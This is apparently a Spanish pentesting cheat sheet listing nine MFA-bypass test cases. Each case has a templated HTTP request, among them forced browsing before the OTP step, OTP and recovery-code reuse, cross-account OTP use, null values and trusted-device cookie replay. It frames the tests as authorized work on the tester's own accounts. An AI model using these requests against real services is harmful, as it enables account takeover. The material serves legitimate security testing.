# 🗡️ Bypass de MFA: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. Forced browsing antes del OTP

**Objetivo:** Con contraseña propia válida y MFA pendiente, pedir la ruta final directamente.

```http
GET /my-account HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_MFA_PENDIENTE}
```

**Interpretación:** Confirmar datos o acciones protegidas, no solo un 200 de una pantalla vacía.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 2. Endpoint API alternativo

**Objetivo:** Comparar la UI MFA con la API que alimenta la cuenta bajo la misma sesión pendiente.

```http
GET /api/v1/me HTTP/1.1
Host: {ORIGEN}
Authorization: Bearer {TOKEN_MFA_PENDIENTE}
```

**Interpretación:** Una UI bloqueada y una API con datos privados muestran enforcement inconsistente.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/authentication/multi-factor).

### 3. OTP de cuenta B en flujo A

**Objetivo:** Usar dos cuentas propias para comprobar vinculación de código a usuario y transacción.

```http
POST /mfa/verify HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={OTP_ACTUAL_DE_B}
```

**Interpretación:** Si A avanza, confirmar identidad y estado final. Los OTP de terceros quedan fuera.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/authentication/multi-factor).

### 4. OTP reutilizado

**Objetivo:** Usar por segunda vez un código propio ya consumido.

```http
POST /mfa/verify HTTP/1.1
Host: {ORIGEN}
Cookie: session={NUEVA_SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={OTP_PROPIO_YA_CONSUMIDO}
```

**Interpretación:** Distinguir TOTP aún vigente de código de un solo uso si el producto promete consumo único.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 5. Valor vacío y tipo inesperado

**Objetivo:** Comparar rechazo de código vacío, null o estructura, una variación por request.

```json
{"otp":null}
```

**Interpretación:** El servidor debe validar tipo y presencia. Un error 500 es pista de manejo débil, no bypass por sí solo.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 6. Código de respaldo

**Objetivo:** Probar consumo único de un recovery code emitido a la propia cuenta.

```http
POST /mfa/recovery HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}
Content-Type: application/x-www-form-urlencoded

code={CODIGO_RESCATE_PROPIO_YA_USADO}
```

**Interpretación:** El segundo uso debe fallar; guardar el código solo localmente y eliminarlo de la evidencia.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 7. Remember device en navegador distinto

**Objetivo:** Reutilizar un token propio de dispositivo confiable en otro perfil controlado.

```http
GET /my-account HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_A_MFA_PENDIENTE}; trusted_device={TOKEN_DISPOSITIVO_PROPIO}
```

**Interpretación:** Documentar si está ligado a cuenta, dispositivo, expiración y revocación; un cookie portátil puede ser diseño débil.

**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/authentication/multi-factor).

### 8. Cambio de contraseña y factor

**Objetivo:** Usar recuperación de la cuenta propia y revisar si crea una sesión plenamente verificada.

```http
GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_TRAS_RESET_PROPIO}
```

**Interpretación:** Solo hay bypass si el reset permite acciones protegidas por MFA sin segundo factor equivalente.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

### 9. Sesión anterior al activar MFA

**Objetivo:** Comparar sesiones propias abiertas antes y después de activar MFA.

```http
GET /api/security/settings HTTP/1.1
Host: {ORIGEN}
Cookie: session={SESION_ANTERIOR_A_ACTIVAR_MFA}
```

**Interpretación:** Revisar política de revocación; puede requerir invalidar sesiones viejas al activar factor.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Account%20Takeover/mfa-bypass.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
